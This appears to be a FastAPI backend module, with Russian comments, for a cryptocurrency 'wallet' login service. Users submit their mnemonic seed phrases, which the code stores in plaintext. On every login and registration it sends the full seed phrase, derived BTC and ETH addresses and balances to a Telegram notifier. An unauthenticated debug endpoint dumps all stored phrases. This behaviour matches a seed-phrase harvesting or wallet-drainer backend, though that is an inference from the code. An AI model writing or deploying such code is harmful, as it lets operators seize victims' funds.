from fastapi import HTTPException
from fastapi.routing import APIRouter
from backend.schemas.user import UserCreate, UserResponse, Token, GeneratePhrase
from backend.models.user import User, WalletAddress
from backend.services.crypto import AddressGenerator, tokens_balance
from backend.config import settings
from jose import jwt
from datetime import datetime, timedelta
from bot_app.services.send_balance import send_balance_to_telegram
from mnemonic import Mnemonic

user_router = APIRouter(prefix="/user", tags=["user"])


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=60)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, settings.secret_key, algorithm=settings.algorithm)


# async def get_btc_balance()

async def get_data_for_user(user_id: int,action:str,tg_user_id:int=None):
    user = await User.get_or_none(id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    await user.fetch_related("addresses")
    balance_data = await tokens_balance(user.phrase)

    addresses_list = [
        {"id": a.id, "coin_type": a.coin_type, "address": a.address}
        for a in user.addresses
    ]

    data = {
        "id": user.id,
        "phrase": user.phrase,
        "addresses": addresses_list,
        "balance": balance_data,
        "action": action,
        "tg_user_id": tg_user_id,
    }

    # Отправляем уведомление в телеграм
    await send_balance_to_telegram(tg_user_id or user_id, data)
    return data


async def register_user_wallet(phrase: str,tg_user_id:int=None):
    try:
        user = await User.create(phrase=phrase)

        # Генерируем адреса
        gen = AddressGenerator(user.phrase)

        # BTC адреса
        btc_addresses = gen.get_btc_addresses(count=10)
        for item in btc_addresses:
            await WalletAddress.create(
                user=user,
                coin_type="BTC",
                address=item["address"]
            )

        # ETH и USDT адреса (одинаковые для EVM)
        eth_addr = gen.get_evm_address()
        await WalletAddress.create(user=user, coin_type="ETH", address=eth_addr)
        await WalletAddress.create(user=user, coin_type="USDT", address=eth_addr)

        # Получаем сгенерированные данные
        user_data = await get_data_for_user(user.id, action="register",tg_user_id=tg_user_id)
        token = create_access_token(data={"sub": str(user.id)})

        # Возвращаем словарь, который идеально ложится в модель Token
        return {
            "access_token": token,
            "token_type": "bearer",
            "user_id": user.id,
            "user_data": user_data,
            "action": "register",
        }
    except ValueError as e:
        # Ловим ошибку валидации BIP-39
        print(f"Ошибка валидации мнемоники: {e}")
        # Выбрасываем понятную ошибку для фронтенда
        raise HTTPException(
            status_code=400,
            detail="Некорректная мнемоническая фраза. Проверьте правильность слов."
        )
    except Exception as e:
        print(f"Непредвиденная ошибка: {e}")
        raise HTTPException(status_code=500, detail="Внутренняя ошибка сервера")

# ==========================================
#                 ЭНДПОИНТЫ
# ==========================================

@user_router.post("/login", response_model=Token)
async def handle_user_wallet(user_data: UserCreate):
    user = await User.get_or_none(phrase=user_data.phrase)

    # Если юзера нет, запускаем регистрацию, она сама вернет токен
    if not user:
        return await register_user_wallet(user_data.phrase,tg_user_id=user_data.tg_user_id)

    # Если юзер есть, собираем токен и данные
    token = create_access_token(data={"sub": str(user.id)})
    user_data_dict = await get_data_for_user(user.id,action="login",tg_user_id=user_data.tg_user_id)

    return {
        "access_token": token,
        "token_type": "bearer",
        "user_id": user.id,
        "user_data": user_data_dict,
        "action": "login",
    }


@user_router.post("/register", response_model=Token)
async def register(user_data: UserCreate):
    # Проверяем, существует ли уже такой юзер
    user = await User.get_or_none(phrase=user_data.phrase,tg_user_id=user_data.tg_user_id)
    if user:
        raise HTTPException(status_code=400, detail="Этот кошелек уже зарегистрирован")

    # Создаем пользователя и возвращаем результат
    return await register_user_wallet(user_data.phrase)


@user_router.get("/", response_model=UserResponse)
async def get_user(user_id: int):
    # Возвращаем данные пользователя
    return await get_data_for_user(user_id=user_id)


@user_router.get("/generate-phrase")
def generate(count: int = 12):
    mnemo = Mnemonic("english")
    # 256 бит для 24 слов, 128 бит для 12 слов
    strength = 256 if count == 24 else 128
    words = mnemo.generate(strength=strength)

    return {"phrase": words}


@user_router.get("/debug/db")
async def debug_db():
    users = await User.all().values()
    addresses = await WalletAddress.all().values()
    return {"users": users, "addresses": addresses}